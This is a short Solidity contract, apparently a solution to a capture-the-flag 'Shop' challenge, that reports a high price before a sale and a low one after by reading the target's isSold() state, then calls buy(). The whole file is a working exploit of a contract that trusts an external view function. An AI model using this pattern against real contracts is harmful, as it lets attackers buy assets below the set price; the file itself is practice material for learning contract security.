// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

contract ShopAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function price() external view returns (uint _price) {
        (, bytes memory returnData) = challengeInstance.staticcall(abi.encodeWithSignature("isSold()"));
        bool isSold = abi.decode(returnData, (bool));
        _price = isSold ? 1 : 100;
    }

    function attack() external {
        challengeInstance.call(abi.encodeWithSignature("buy()"));
    }
}